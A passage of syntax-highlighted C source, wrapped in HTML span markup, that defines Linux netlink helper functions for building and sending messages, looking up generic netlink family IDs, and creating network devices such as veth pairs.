<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">attr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>
<span class="w">  </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">NLMSG_ALIGN</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_len</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_nest</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">typ</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="p">)</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">;</span>
<span class="w">  </span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">typ</span><span class="p">;</span>
<span class="w">  </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">attr</span><span class="p">);</span>
<span class="w">  </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">nested</span><span class="p">[</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">nesting</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">attr</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_done</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">nested</span><span class="p">[</span><span class="o">--</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">nesting</span><span class="p">];</span>
<span class="w">  </span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">attr</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_send_ext</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">reply_type</span><span class="p">,</span>
<span class="w">                            </span><span class="kt">int</span><span class="o">*</span><span class="w"> </span><span class="n">reply_len</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">dofail</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">nesting</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="o">*</span><span class="w"> </span><span class="n">hdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="o">*</span><span class="p">)</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">;</span>
<span class="w">  </span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_nl</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
<span class="w">  </span><span class="n">addr</span><span class="p">.</span><span class="n">nl_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">;</span>
<span class="w">  </span><span class="kt">ssize_t</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sendto</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">                     </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dofail</span><span class="p">)</span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">recv</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">reply_len</span><span class="p">)</span>
<span class="w">    </span><span class="o">*</span><span class="n">reply_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dofail</span><span class="p">)</span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EINVAL</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dofail</span><span class="p">)</span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NLMSG_DONE</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">reply_len</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">reply_type</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">*</span><span class="n">reply_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="kt">ssize_t</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsgerr</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EINVAL</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dofail</span><span class="p">)</span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_type</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">NLMSG_ERROR</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EINVAL</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dofail</span><span class="p">)</span>
<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="p">((</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsgerr</span><span class="o">*</span><span class="p">)(</span><span class="n">hdr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">errno</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_send</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">netlink_send_ext</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_query_family_id</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span>
<span class="w">                                   </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">family_name</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">dofail</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">genlmsghdr</span><span class="w"> </span><span class="n">genlhdr</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">genlhdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">genlhdr</span><span class="p">.</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CTRL_CMD_GETFAMILY</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">GENL_ID_CTRL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">genlhdr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">CTRL_ATTR_FAMILY_NAME</span><span class="p">,</span><span class="w"> </span><span class="n">family_name</span><span class="p">,</span>
<span class="w">               </span><span class="n">strnlen</span><span class="p">(</span><span class="n">family_name</span><span class="p">,</span><span class="w"> </span><span class="n">GENL_NAMSIZ</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send_ext</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">GENL_ID_CTRL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="n">dofail</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="p">)(</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">NLMSG_HDRLEN</span><span class="w"> </span><span class="o">+</span>
<span class="w">                                         </span><span class="n">NLMSG_ALIGN</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">)));</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(;</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">attr</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
<span class="w">       </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlattr</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">attr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">NLMSG_ALIGN</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_len</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">nla_type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">CTRL_ATTR_FAMILY_ID</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint16_t</span><span class="o">*</span><span class="p">)(</span><span class="n">attr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">id</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EINVAL</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">recv</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">id</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_next_msg</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span>
<span class="w">                            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">total_len</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="o">*</span><span class="w"> </span><span class="n">hdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsghdr</span><span class="o">*</span><span class="p">)(</span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">total_len</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">total_len</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">nlmsg_len</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_device_impl</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">type</span><span class="p">,</span>
<span class="w">                                    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">up</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">ifinfomsg</span><span class="w"> </span><span class="n">hdr</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">up</span><span class="p">)</span>
<span class="w">    </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifi_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifi_change</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IFF_UP</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">RTM_NEWLINK</span><span class="p">,</span><span class="w"> </span><span class="n">NLM_F_EXCL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">NLM_F_CREATE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="w">    </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_IFNAME</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_LINKINFO</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_KIND</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">type</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_device</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">type</span><span class="p">,</span>
<span class="w">                               </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_veth</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span>
<span class="w">                             </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">peer</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;veth&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_DATA</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">VETH_INFO_PEER</span><span class="p">);</span>
<span class="w">  </span><span class="n">nlmsg</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">ifinfomsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_IFNAME</span><span class="p">,</span><span class="w"> </span><span class="n">peer</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">peer</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
